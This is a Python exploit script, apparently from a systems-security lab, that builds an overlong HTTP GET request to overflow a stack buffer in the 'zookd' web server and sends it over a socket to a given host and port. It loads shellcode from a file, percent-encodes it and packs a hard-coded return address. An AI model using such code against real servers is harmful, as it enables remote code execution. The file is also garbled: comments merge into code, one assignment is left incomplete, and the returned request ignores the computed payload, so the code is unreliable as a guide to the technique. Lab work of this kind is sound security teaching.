#!/usr/bin/env python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are jus## examplesstack_buffer = 0x3456789stack_saved_ebp = 0x1234567stack_retaddr = stack_saved_ebp +
## This is the function that you should modify to construct a## HTTP request that will cause a buffer overflow in some part
def build_exploit(shellcode):    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    evil_bin = urllib.quote(shellcode)
    buff_offset = len(shellcode) #uri will be decoded back to original form/size
    # address of name:
    evil_bin_point = struct.pack('I', 0x80510b4)

    # insert the binary as the uri, fill the rest of pn with junk (pn = 16 (cwd) + 48 (size of shellcode)
    # + 960 (junk), since name still has space insert the address of buf that contains the bin at the
    # beginning (name)
    req =   "GET " + "/../"*1024 + " HTTP/1.0\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    with open('shellcode.bin', 'rb') as f: shellcode = f.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

